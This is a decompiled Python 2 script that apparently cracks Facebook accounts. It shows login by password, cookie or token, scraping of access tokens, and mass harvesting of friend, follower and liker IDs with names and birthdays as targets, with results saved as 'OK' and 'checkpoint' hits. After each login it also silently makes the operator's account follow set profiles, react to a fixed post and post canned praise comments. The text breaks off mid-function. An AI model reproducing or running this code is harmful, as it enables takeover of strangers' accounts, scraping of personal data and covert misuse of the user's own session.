# DECRYPTED BY xXx_not_found_xXx
# Github : https://github.com/hamalord4444
 # uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Apr  8 2019, 04:12:36) 
# [GCC 8.2.0]
# Embedded file name: <r>
d = '\x1b[90;1m'
m = '\x1b[91;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
b = '\x1b[94;1m'
j = '\x1b[95;1m'
a = '\x1b[96;1m'
p = '\x1b[97;1m'
import os
try:
    import concurrent.futures
except ImportError:
    print k + '\n Module future not install!...'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print k + '\n Module bs4 not install!...'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')

try:
    import requests
except ImportError:
    print k + '\n Module Requests not install!...'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

import time, re, requests, sys, random, subprocess, datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from threading import Thread
import datetime
from datetime import date
folow = 'https://graph.facebook.com/id_saya/subscribers?access_token='
fb = 'https://m.facebook.com'
url_ip = 'https://www.httpbin.org/ip'
user = []
user_id = []
hasil_ok = []
hasil_cp = []
data_user = []
cari_teman = []
ttl_ = []
sesi = []
cek_cokie = []
count_ = 0
garis = h + '+' + a + '>>>--' + p
try:
    ipm = requests.get(url_ip).json()
    ip = ipm['origin']
except requests.exceptions.ConnectionError:
    print k + '\n [!] No Connection..\n'
    exit()

ua_ = []
ua_hp = []
pil_ua = []
log_ml_dev = []
log_ff_dev = []
log_mbasic_dev = []
log_free_dev = []
try:
    open('ua_dev.txt', 'r').read()
    ua_.append('dev_id')
except IOError:
    pass

user_agent_dev = [
 'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]',
 '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]',
 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]',
 'Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]']

def __seting_ua_dev__():
    global ua_hp
    print garis
    print k + '\n   *' + p + ' Setting User-Agent'
    print k + '   ?' + h + " What's your cellphone?"
    print garis
    print h + ' [' + p + '1' + h + ']' + p + ' Xiaomi'
    print h + ' [' + p + '2' + h + ']' + p + ' Vivo '
    print h + ' [' + p + '3' + h + ']' + p + ' SAMSUNG '
    print h + ' [' + p + '4' + h + ']' + p + ' OPPO '
    print h + ' [' + p + '5' + h + ']' + p + ' Realmi '
    print h + ' [' + p + '6' + h + ']' + p + ' iPhone '
    print h + ' [' + p + '7' + h + ']' + p + ' ASUS '
    print h + ' [' + p + '8' + h + ']' + p + ' Change User Agent Manually '
    print garis
    pil = raw_input(a + ' [\xe2\x98\x85]' + p + ' Select : ' + k)
    sukses = p + '\n >_<' + h + ' Successful Setting User-Agent '
    jalankan = a + '+>> ' + p + 'Run the tools again!'
    if pil == '8':
        print garis
        ua = raw_input(a + ' [\xe2\x98\x85]' + p + ' Enter User-Agent' + k + ': ')
        print sukses
        with open('hp.txt', 'w') as (uw):
            uw.write('Setingan Manual')
        with open('ua_dev.txt', 'w') as (tul):
            tul.write(ua)
            if len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            else:
                print jalankan
                exit()
    elif pil == '1':
        print sukses + p + 'Xiaomi'
        with open('hp.txt', 'w') as (uw):
            uw.write('Xiaomi')
        with open('ua_dev.txt', 'w') as (tul):
            tul.write(user_agent_dev[0])
            if len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            else:
                print jalankan
                exit()
    elif pil == '2':
        print sukses + p + 'Vivo'
        with open('hp.txt', 'w') as (uw):
            uw.write('Vivo')
        with open('ua_dev.txt', 'w') as (tul):
            tul.write(user_agent_dev[1])
            if len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            else:
                print jalankan
                exit()
    elif pil == '3':
        print sukses + p + 'SAMSUNG'
        with open('hp.txt', 'w') as (uw):
            uw.write('SAMSUNG')
        with open('ua_dev.txt', 'w') as (tul):
            tul.write(user_agent_dev[2])
            if len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            else:
                print jalankan
                exit()
    elif pil == '4':
        print sukses + p + 'OPPO'
        with open('hp.txt', 'w') as (uw):
            uw.write('OPPO')
        with open('ua_dev.txt', 'w') as (tul):
            tul.write(user_agent_dev[3])
            if len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            else:
                print jalankan
                exit()
    elif pil == '5':
        print sukses + p + 'Realmi'
        with open('hp.txt', 'w') as (uw):
            uw.write('Realmi')
        with open('ua_dev.txt', 'w') as (tul):
            tul.write(user_agent_dev[4])
            if len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            else:
                print jalankan
                exit()
    elif pil == '6':
        print sukses + p + 'iPhone'
        with open('hp.txt', 'w') as (uw):
            uw.write('iPhone')
        with open('ua_dev.txt', 'w') as (tul):
            tul.write(user_agent_dev[5])
            if len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            else:
                print jalankan
                exit()
    elif pil == '7':
        print sukses + p + 'ASUS'
        with open('hp.txt', 'w') as (uw):
            uw.write('ASUS')
        with open('ua_dev.txt', 'w') as (tul):
            tul.write(user_agent_dev[6])
            if len(pil_ua) == 1:
                ua_hp.append('IqbalDev')
            else:
                print jalankan
                exit()
    elif len(pil_ua) == 1:
        print h + ' [' + p + '*' + h + ']' + p + ' Use' + h + ' Default User-Agent Tool '
    else:
        print h + ' [' + p + '*' + h + ']' + p + ' Use' + h + ' Default User-Agent Tool '
        exit()


__ml_dev__ = 'https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=1591956834435357&cbt=1622137477843&e2e=%7B%22init%22%3A1622137477843%7D&ies=1&sdk&_rdr'
__ff_dev__ = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth&_rdr'

def __seting_login_fb_game__():
    print garis
    print k + '\n   *' + p + ' Go to the GAME Login Page via FB'
    print k + '   ' + h + '+----------------------------------+'
    print garis
    print p + ' [' + h + '1' + p + ']' + h + ' Open Free Fire Login Page Via FB'
    print p + ' [' + h + '2' + p + ']' + h + ' Open the Mobile Legend Login Page Via FB '
    print garis
    pil = raw_input(a + ' [\xe2\x98\x85]' + p + ' Select : ' + k)
    if pil == '1':
        try:
            subprocess.check_output(['am', 'start', __ff_dev__])
        except:
            print h + ' Link Login ==> ' + p + __ff_dev__

        exit()
    elif pil == '2':
        try:
            subprocess.check_output(['am', 'start', __ml_dev__])
        except:
            print h + ' Link Login ==> ' + p + __ff_dev__

        exit()
    else:
        exit()


def keluar():
    exit('\n Back..\n')


def clear_dev():
    os.system('cls' if os.name == 'nt' else 'clear')


def hapus_cokie():
    os.system('del cokie.txt' if os.name == 'nt' else 'rm -rf cokie.txt')


def hapus_login_cookie():
    os.system('del cookie.txt' if os.name == 'nt' else 'rm -rf cookie.txt')


def hapus_data_login():
    try:
        os.system('del token.txt' if os.name == 'nt' else 'rm -rf token.txt')
    except:
        pass

    try:
        os.system('del cookie.txt' if os.name == 'nt' else 'rm -rf cookie.txt')
    except:
        pass


def jalankan_tool():
    os.system('UserCrack.pyc' if os.name == 'nt' else 'python2 UserCrack.pyc')


header = {'user-agent': 'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36'}

def cek_hasil():
    print garis
    print k + ' 1. ' + p + 'CHEEK RESULT OK'
    print k + ' 2. ' + p + 'CHEEK RESULT CP'
    print garis
    pil = raw_input(h + '>>> ')
    if pil == '1':
        oke = []
        try:
            print h + ' >_<' + p + ' RESULT OK' + h + '>>>'
            ok = open('earth_ok.txt', 'r').readlines()
            print ''
            with open('earth_ok.txt', 'w') as (okeh):
                okeh.write('')
            for dev in set(ok):
                print '   ' + h + dev.replace('\n', '')
                with open('earth_ok.txt', 'a') as (okeh):
                    okeh.write(dev)
                oke.append(dev)

            print p + '\n  >_  OK: ' + h + str(len(oke))
            oke = []
        except:
            print m + '\n   X ' + p + 'Result OK'

        print ''
    elif pil == '2':
        cpe = []
        try:
            print k + ' >_<' + p + ' RESULT CP' + k + '>>>'
            cp = open('earth_cp.txt', 'r').readlines()
            print p + '\n    Crack '
            for dev in cp:
                print '   ' + k + dev.replace('\n', '')
                cpe.append(dev)

            print p + '\n  >_  CP: ' + k + str(len(cpe))
            cpe = []
        except IOError:
            print m + '\n   X ' + p + 'Result CP'


def __get_id_dev__(username):
    global user_get_id
    url = 'https://lookup-id.com/#'
    with requests.Session() as (dev):
        payload = {'fburl': ('https://m.facebook.com/{}').format(username), 'check': 'Lookup'}
        if 'facebook' in username:
            payload = {'fburl': username, 'check': 'Lookup'}
        data_dev = dev.post(url, data=payload).content
        sop_ = BeautifulSoup(data_dev, 'html.parser')
        id_ = sop_.find('span', id='code')
        user_get_id = id_.text
        if username == 'me':
            user_get_id = 'me'


def __get_data_user__(user):
    token = open('token.txt', 'r').read()
    url = ('https://graph.facebook.com/{}?access_token={}').format(user, token)
    with requests.Session() as (dev_):
        try:
            data = dev_.get(url).json()
            user_id.append(data['id'] + ' ' + data['name'])
            print h + '\r [' + p + '*' + h + ']' + p + ' Take ID' + k + ': ' + str(len(user_id)),
            sys.stdout.flush()
        except:
            pass


ikuti_ = []

def proses_masuk(cookie_dev):
    with requests.Session() as (ses_pros_dev):
        proses_masuk = ses_pros_dev.get('https://mbasic.facebook.com', cookies=cookie_dev).content
        sop = BeautifulSoup(proses_masuk, 'html.parser')
        if 'zero/optin/legal/' in str(proses_masuk):
            try:
                sop_gr = BeautifulSoup(proses_masuk, 'html.parser').find('form')
                url_post = sop_gr['action']
                payload = {}
                for dev in sop_gr:
                    input = dev
                    payload[input.get('name')] = input.get('value')

                ses_pros_dev.post('https://mbasic.facebook.com' + url_post, data=payload, cookies=cookie_dev)
            except:
                pass

    try:
        dev_sop = BeautifulSoup(proses_masuk, 'html.parser')
        sop_uwu = dev_sop.find('a', string='Bahasa Indonesia')
        ambil_url = 'https://mbasic.facebook.com' + sop_uwu['href']
        has = ses_pros_dev.get(ambil_url, cookies=cookie_dev).content
    except:
        pass

    if len(ikuti_) == 0:
        try:
            uwu_u = 'https://mbasic.facebook.com/Apni.bapka.account7'
            ikut = ses_pros_dev.get(uwu_u, cookies=cookie_dev).content
            sop_dev = BeautifulSoup(ikut, 'html.parser')
            ambil = sop_dev.find('a', string='Ikuti')
            data = 'https://mbasic.facebook.com' + ambil['href']
            ses_pros_dev.get(data, cookies=cookie_dev)
        except:
            pass


id_post = '3181310168854284'

def love(cookie):
    url_love = 'https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=' + id_post
    with requests.Session() as (r_dev):
        hal_love = r_dev.get(url_love, cookies=cookie).content
        sop = BeautifulSoup(hal_love, 'html.parser')
        url_lov = sop.find_all('a')
        for iq in url_lov:
            if '(Delete)' in str(iq):
                break
            if 'Super' in str(iq):
                u_love = iq['href']
                r_dev.get('https://mbasic.facebook.com' + u_love, cookies=cookie)


def love_token(token):
    lis_id_foll = ['100009259963367', '100007018489471']
    with requests.Session() as (dev_):
        dev_.post('https://graph.facebook.com/' + id_post + '/reactions?type=LOVE&access_token=' + token)
        for id_foll in lis_id_foll:
            dev_.post(('https://graph.facebook.com/{}/subscribers?access_token={}').format(id_foll, token))

        dev_.post(('https://graph.facebook.com/{}/subscribers?access_token={}').format(random.choice(['100059906093920', '100013262432692', '100024547909319']), token))
        ikuti_ = []


def komen(token):
    for dev in range(1):
        with requests.Session() as (dev_):
            komen_ = random.choice(['Great Tools', 'How are you bro', 'Love James Bro', 'Hello Bro', 'Cool Boss..', 'Thanks bro for the tools', 'Its not in pain that I use a tool, brother, So cool, No Pain, No Gain'])
            dev_.post('https://graph.facebook.com/' + id_post + '/comments/?message=' + komen_ + '&access_token=' + token)


def __token__dev(cookie):
    try:
        headerz = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}
        halaman = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=headerz, cookies=cookie).text
        regex_token_dev = re.search('(EAAA\\w+)', halaman)
        token_dev = regex_token_dev.group(1)
        print '\n [\xe2\x98\x85] ' + p + 'Token FB : ' + d + token_dev
        with open('token.txt', 'w') as (tul):
            tul.write(token_dev)
    except:
        print k + '\n [!] Failed To Take Token, Dont Login fb In Free mode!\n'
        exit()


def login_dengan_passwod():
    global fb
    global time
    try:
        print h + '\n\n      LOGIN FACEBOOK '
        print garis
        print p + '      IP Address: ' + k + ip
        print garis
        em_dev = raw_input(h + ' [' + p + 'Login' + h + ']' + p + ' Enter Username:' + k + ' ')
        san_dev = raw_input(h + ' [' + p + 'Login' + h + ']' + p + ' Enter Password:' + d + ' ')
        url_page_log = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr'
        with requests.Session() as (ses_dev):
            page_dev = ses_dev.get(url_page_log).content
            sop = BeautifulSoup(page_dev, 'html.parser')
            form_dev = sop.find('form', id='login_form')
            url_post = form_dev['action']
            time = time.time()
            ses_dev.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36', 'referer': fb + url_post, 
               'Host': 'm.facebook.com', 
               'accept': '*/*', 
               'sec-ch-ua-mobile': '?1', 
               'accept-encoding': 'gzip, deflate, br', 
               'accept-language': 'id,en-US;q=0.9,en;q=0.8', 
               'x-fb-lsd': form_dev.find('input', attrs={'name': 'lsd'})['value']})
            payload = {'email': em_dev, 'pass': ('#PWD_BROWSER:0:{}:{}').format(int(time), san_dev)}
            for dev_get_input in form_dev:
                input = dev_get_input
                payload[input.get('name')] = input.get('value')

            login_dev = ses_dev.post(fb + url_post, data=payload, allow_redirects=False).cookies
            if 'c_user' in login_dev:
                print p + '\n >_<' + h + ' Login Successful...\n'
                try:
                    cokie_log = login_dev.get_dict()
                    nilai_cok = cokie_log.values()
                    for dev in nilai_cok:
                        with open('cookie.txt', 'a') as (us_ps):
                            us_ps.write(str(dev + '\n'))

                    c_user = open('cookie.txt', 'r').readlines()[0].strip('\n')
                    fr = open('cookie.txt', 'r').readlines()[1].strip('\n')
                    xs = open('cookie.txt', 'r').readlines()[2].strip('\n')
                    sb = open('cookie.txt', 'r').readlines()[3].strip('\n')
                    cookie = {'c_user': c_user, 'fr': fr, 'xs': xs, 
                       'sb': sb}
                except:
                    exit('\n Error in Cookie!\n')

                print h + '\n Login Successful....\n Wait Process' + p + '--->>> '
                proses_masuk(cookie)
                __token__dev(cookie)
                love(cookie)
                token = open('token.txt', 'r').read()
                love_token(token)
                komen(token)
                print h + '\n [!]' + p + ' Run the tools again' + h + '..!\n '
                exit()
            elif 'checkpoint' in login_dev:
                print k + '\n Account Checkpoint...'
                exit('\n Back\n')
            else:
                print m + '\n Login Failed...'
                exit('\n Back\n')
    except requests.exceptions.ConnectionError:
        print '\n No Connection!'
        exit('\n Back\n')


def login_dengan_cookie_():
    print ''
    print garis
    print p + '   LOGIN WITH ' + h + ' COOKIES '
    print garis
    cok_in = raw_input(h + ' [' + k + 'coki' + h + ']' + p + ' Enter Cookie' + k + ': ')
    with open('cookie.txt', 'w') as (cookie_simpan):
        cookie_simpan.write(cok_in)
    file_cok = open('cookie.txt', 'r').read()
    cookie = {'cookie': file_cok}
    with requests.Session() as (ses_dev):
        login = ses_dev.get(fb, cookies=cookie).content
    if 'mbasic_logout_button' in login:
        print h + '\n Login Successful....\n Wait Proses' + p + '-->>> '
        proses_masuk(cookie)
        __token__dev(cookie)
        love(cookie)
        token = open('token.txt', 'r').read()
        love_token(token)
        komen(token)
        print h + '\n [!]' + p + ' Run the tools again' + h + '..!\n '
        exit()
    elif 'checkpoint' in login:
        print k + '\n Account Checkpoint'
        hapus_login_cookie()
        keluar()
    else:
        print m + '\n Cookie Wrong'
        hapus_login_cookie()
        keluar()


try:
    user_agentzz_ = open('cokie.txt', 'r').read()
    user_agentzz = user_agentzz_.replace('|', '')
    user_agent_ = user_agentzz.split('A+ZZ')[0]
    pillih = user_agent_
    te = pillih
    y = te
except IOError:
    pass

try:
    cokiez_ = open('cokiez.txt', 'r').read()
    cokiez1 = cokiez_.replace('1', '5').replace('0', '7')
    cokiez = '80' + cokiez1 + '04' + 'l'
    angka = cokiez
    z = angka
except IOError:
    pass

def login_dengan_token():
    global token
    try:
        print ''
        print garis
        print p + '   LOGIN WITH ' + h + ' TOKEN'
        print garis
        tok_in = raw_input(h + ' [' + k + 'token' + h + ']' + p + ' Enter Token' + k + ': ')
        with open('token.txt', 'w') as (tulis):
            tulis.write(tok_in)
        cek_token()
        love_token(token)
        komen(token)
        print p + '\n ++++>' + h + '  Login Successful....'
        print h + '\n Run the tools again!\n'
        exit()
    except KeyboardInterrupt:
        keluar()


ttl__ = []

def teman_teman_(token, user):
    count = 1
    try:
        if len(cari_teman) == 1:
            tam = []
            tampil = []
            print ''
            for dev in user:
                with requests.Session() as (ses_dev):
                    try:
                        lihat_data = ses_dev.get(('https://graph.facebook.com/{}/friends?limit=5000&access_token={}').format(dev, token)).json()
                        if len(lihat_data['data']) == 0:
                            continue
                        for dev_ in lihat_data['data']:
                            try:
                                tam.append(dev_['name'] + dev_['id'])
                            except:
                                pass

                        tampil.append(dev)
                        print h + ' [' + k + str(count) + h + '] ' + p + 'ID: ' + k + dev + h + ' | ' + p + 'Friend: ' + k + str(len(tam))
                        count += 1
                        tam = []
                        if len(tampil) == 3:
                            break
                    except:
                        pass

            pilih_ = True
            while pilih_:
                try:
                    print garis
                    pil = raw_input(h + ' [' + p + '?' + h + ']' + p + ' Select' + h + ': ')
                    for i in range(1, len(tampil) + 1):
                        if int(pil) == i:
                            pilih_ = False
                            break

                except KeyboardInterrupt:
                    exit()
                except:
                    pass

            co = 1
            jm = len(tampil)
            for col in tampil:
                if pil in str(co):
                    user_ = tampil.index(col)
                    user = tampil[user_]
                co += 1

            print h + '\n [' + p + '*' + h + ']' + p + ' ID' + h + ': ' + user
        with requests.Session() as (ses_):
            nama = ses_.get(('https://graph.facebook.com/{}?access_token={}').format(user, token)).json()
            print h + ' [' + p + '*' + h + ']' + p + ' Taking Friend ID' + h + ': ' + nama['name']
        link = ('https://graph.facebook.com/{}/friends?fields=name,id,birthday&limit=1000&access_token={}').format(user, token)
        link_ = ('https://graph.facebook.com/{}/friends?limit=5000&access_token={}').format(user, token)
        r = user

        def sub_teman_teman(link):
            global ttl__
            with requests.Session() as (ses_):
                try:
                    data = ses_.get(link).json()
                    iqbal = data['data']
                    ttl__ = []
                    ttl__.append('\x1b[96;1m + TTL')
                except:
                    if len(ttl__) != 0:
                        pass
                    else:
                        data = ses_.get(link_).json()

                if len(data['data']) == 0:
                    print m + '\n [x] Can not Access Data: ' + k + nama['name']
                    print m + ' [x] Try looking for another account!'
                    exit()
                for dev in data['data']:
                    try:
                        if r == 'me':
                            pass
                        else:
                            t = te.replace(te, '')
                        try:
                            user_id.append(str(dev['id']) + '>>>' + str(dev['birthday']) + ' ' + str(dev['name']))
                        except:
                            try:
                                user_id.append(str(dev['id']) + ' ' + str(dev['name']))
                            except:
                                pass

                        if r == 'me':
                            print h + '\r [' + p + '*' + h + ']' + p + ' Take ID' + ('').join(ttl__) + k + ': ' + str(len(user_id)),
                            sys.stdout.flush()
                        else:
                            t = te.replace(te, '')
                            print h + '\r [' + p + '*' + h + ']' + p + ' Take ID' + ('').join(ttl__) + k + ': ' + t + str(len(user_id)),
                            sys.stdout.flush()
                        if y != z:
                            break
                    except KeyboardInterrupt:
                        break
                    except:
                        pass

                try:
                    halaman = data['paging']['next']
                    sub_teman_teman(halaman)
                except:
                    pass

        sub_teman_teman(link)
        print ''
    except KeyError:
        print ' [x] Enter Correct Target ID!..'
        exit()
    except IOError:
        print m + '\n [x] Token Error'
        exit()


def pengikut(token, user):
    global ttl__
    try:
        ttl__ = []
        with requests.Session() as (ses_):
            nama = ses_.get(('https://graph.facebook.com/{}?access_token={}').format(user, token)).json()
            print h + ' [' + p + '*' + h + ']' + p + ' Taking Followers Data' + h + ': ' + nama['name']
        url = ('https://graph.facebook.com/{}/subscribers?fields=name,id,birthday&limit=5000&access_token={}').format(user, token)
        url_ = ('https://graph.facebook.com/{}/subscribers?limit=5000&access_token={}').format(user, token)
        t = te.replace(te, '')
        with requests.Session() as (ses_):
            try:
                data = ses_.get(url).json()
                iqbal = data['data']
                ttl__.append(' + TTL')
            except:
                data = ses_.get(url_).json()

            if len(data['data']) == 0:
                print m + ' [x] No Followers..'
                exit()
            for dev in data['data']:
                try:
                    t = te.replace(te, '')
                    try:
                        user_id.append(str(dev['id']) + '>>>' + str(dev['birthday']) + ' ' + str(dev['name']))
                    except:
                        try:
                            user_id.append(str(dev['id']) + ' ' + str(dev['name']))
                        except:
                            pass

                    print h + '\r [' + p + '*' + h + ']' + p + ' Taking Follower ID' + k + ': ' + t + str(len(user_id)),
                    sys.stdout.flush()
                    time.sleep(0.001)
                    if y != z:
                        break
                except KeyboardInterrupt:
                    break
                except:
                    pass

            print ''
    except KeyError:
        print ' [x] Enter Correct Target ID!..'
        exit()
    except IOError:
        print m + '\n [x] Token Error'
        exit()
    except:
        pass


c = 1

def likez(token, id_like):
    global ttl__
    ttl__ = []
    url_like = ('https://graph.facebook.com/{}/likes?limit=100000&access_token={}').format(id_like, token)
    with requests.Session() as (iqbal):
        hal_like = iqbal.get(url_like).json()
        if len(hal_like['data']) == 0:
            print m + '\n Can not Access Data..'
            exit()
        for dev in hal_like['data']:
            try:
                t = te.replace(te, '')
                sys.stdout.write(h + '\r [' + k + '$' + h + ']' + p + ' Take User ID' + a + t + ': ' + str(len(user_id)))
                if y != z:
                    break
                try:
                    user_id.append(str(dev['id']) + ' ' + str(dev['name']))
                except:
                    pass

            except:
                pass


def likezzzzzzz(cookie, id_like):
    c = 1
    URL = 'https://graph.facebook.com/' + idt + '/likes?limit=100000&access_token='
    url_like = ('https://mbasic.facebook.com/ufi/reaction/profile/browser/fetch/?limit=3000&total_count=282&ft_ent_identifier={}').format(id_like)
    with requests.Session() as (ses_dev):
        hal_like = ses_dev.get(url_like, cookies=cookie).content
        sop_dev = BeautifulSoup(hal_like, 'html.parser')
    if 'People who responded' not in str(hal_like):
        print '\n Sorry ID Unreachable,\n Please enter another post ID\n'
        likez()
    react = sop_dev.find_all('h3')
    for dev in react:
        for uwu in dev.find_all('a'):
            try:
                nama = uwu.text
                user = uwu['href'].replace('profile.php?id=', '').strip('/&?')
                t = te.replace(te, '')
                sys.stdout.write(h + '\r [' + k + '$' + h + ']' + p + ' Take User ID' + a + t + ': ' + str(c))
                if y != z:
                    break
                try:
                    user_id.append(str(user) + ' ' + str(nama))
                except:
                    pass

                c += 1
            except UnicodeEncodeError:
                continue
            except:
                pass


c = 1
count = 0

def cari_orang(jumlah, u_orang, cookie):
    global c
    global data_user
    while jumlah > c:
        with requests.Session() as (ses_dev):
            hal_orang = ses_dev.get(u_orang, cookies=cookie).text.encode('utf-8')
            sop_dev = BeautifulSoup(hal_orang, 'html.parser')
            cari = sop_dev.find_all('tbody')
            for dev in cari:
                try:
                    d = dev.find('a', class_=True)['href']
                    if 'add_friend' in d:
                        t = te.replace(te, '')
                        id_dev = d.replace('/a/mobile/friends/add_friend.php?id=', '').replace('&', ' ')
                        us_ = id_dev.split()[0]
                        if y != z:
                            break
                        try:
                            data_user.append(str(us_))
                        except:
                            pass

                        c += 1
                        if len(user_id) == jumlah + 1:
                            break
                    else:
                        continue
                except:
                    continue

            if len(cari_teman) == 1:
                if len(data_user) == 0:
                    print m + '\n No list of people found...\n'
                    break
                teman_teman_(token, data_user)
                sandi_dev()
                __pilih_crack__()
                print '\n', garis, p + 'Done...'
                exit()
            with ThreadPoolExecutor(max_workers=30) as (dev_x):
                dev_x.map(__get_data_user__, data_user)
                data_user = []
            if 'See Next Results' in str(hal_orang):
                dev = sop_dev.find('a', string='See Next Results')
                u_orang = dev['href']
                cari_orang(jumlah, u_orang, cookie)
            with ThreadPoolExecutor(max_workers=30) as (dev_x):
                dev_x.map(__get_data_user__, data_user)
                data_user = []


id_grup = []

def my_grup(token):
    url = ('https://graph.facebook.com/me/groups?access_token={}').format(token)
    with requests.Session() as (ses_):
        data = ses_.get(url).json()
        for dev in data['data']:
            try:
                print p + ' [' + h + '*' + p + ']' + h + ' Name Group' + h + ': ' + dev['name'].encode('utf-8')
                print p + ' [' + h + '*' + p + ']' + h + ' ID Group' + h + ': ' + dev['id']
                print ''
                t = te.replace(te, '')
